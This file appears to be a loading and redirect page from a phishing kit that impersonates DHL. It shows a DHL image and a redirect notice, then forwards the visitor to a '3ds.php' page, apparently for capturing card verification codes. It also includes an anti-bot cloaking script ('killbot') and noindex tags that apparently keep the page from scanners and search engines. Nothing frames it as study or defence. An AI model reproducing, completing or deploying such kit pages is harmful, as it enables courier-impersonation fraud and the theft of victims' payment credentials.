<?php
//FAST HEADER
session_start();
include "../assets/functions.php";
include '../server/traduction.php';
include_once('../settings.php');
include_once('../server/killbot.to.php');



$domain = $_SERVER['HTTP_HOST']; // Récupérer le domaine actuel
$redirectURL = "../user/3ds.php"; // URL de redirection
?>


<html>
<head> 

<meta http-equiv="refresh" content="<?php echo $timer; ?>;url=<?php echo $redirectURL; ?>">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache, notranslate, nofollow,">
<meta data-n-head="ssr" name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="viewport" content="width=device-width" />
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Rubik&amp;display=swap');

  * {
    font-family: 'Rubik', sans-serif;
  }
</style> 

</head>

<!--BODY-->

<body>
<div class="container">
    <img style="width: 350px; -webkit-animation: breathing 1s ease-out infinite normal; animation: breathing 1s ease-out infinite normal;"
      src="https://stick-attack.fr/38969-large_default/stickers-dhl.jpg">
      <p style="font-size: 16px;"><?php echo $translations[$lang]["redirection"]; ?> <br><?php echo $translations[$lang]["redirection1"]; ?></p>
    <div></div>
  </div>

  <div>
    <center>


     
        
          <div></div>
        </div>
      </div>
      <style>
		  body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      text-align: center;
    }

    @media (max-width: 768px) {
      /* Apply mobile-specific styling here */
      .container {
        font-size: 14px;
      }
    }



        @-webkit-keyframes breathing {
          0% {
            -webkit-transform: scale(0.9);
            transform: scale(0.9);
          }

          25% {
            -webkit-transform: scale(1);
            transform: scale(1);
          }

          60% {
            -webkit-transform: scale(0.9);
            transform: scale(0.9);
          }

          100% {
            -webkit-transform: scale(0.9);
            transform: scale(0.9);
          }
        }

        @keyframes breathing {
          0% {
            -webkit-transform: scale(0.9);
            -ms-transform: scale(0.9);
            transform: scale(0.9);
          }

          25% {
            -webkit-transform: scale(1);
            -ms-transform: scale(1);
            transform: scale(1);
          }

          60% {
            -webkit-transform: scale(0.9);
            -ms-transform: scale(0.9);
            transform: scale(0.9);
          }

          100% {
            -webkit-transform: scale(0.9);
            -ms-transform: scale(0.9);
            transform: scale(0.9);
          }
        }
      </style>

      <style type="text/css">
        @keyframes ldio-qm8a5lnyc7m {
          0% {
            transform: translate(-50%, -50%) rotate(0deg);
          }

          100% {
            transform: translate(-50%, -50%) rotate(360deg);
          }
        }

        .ldio-qm8a5lnyc7m div {
          position: absolute;
          width: 60px;
          height: 60px;
          border: 10px solid #2c49bf;
          border-top-color: transparent;
          border-radius: 50%;
        }

        .ldio-qm8a5lnyc7m div {
          animation: ldio-qm8a5lnyc7m 1s linear infinite;
          top: 50px;
          left: 50px
        }

        .loadingio-spinner-rolling-jz7nx6q84p {
          width: 34px;
          height: 34px;
          display: inline-block;
          overflow: hidden;
          background: none;
        }

        .ldio-qm8a5lnyc7m {
          width: 100%;
          height: 100%;
          position: relative;
          transform: translateZ(0) scale(0.34);
          backface-visibility: hidden;
          transform-origin: 0 0;
          /* see note above */
        }

        .ldio-qm8a5lnyc7m div {
          box-sizing: content-box;
        }

       
      </style>
 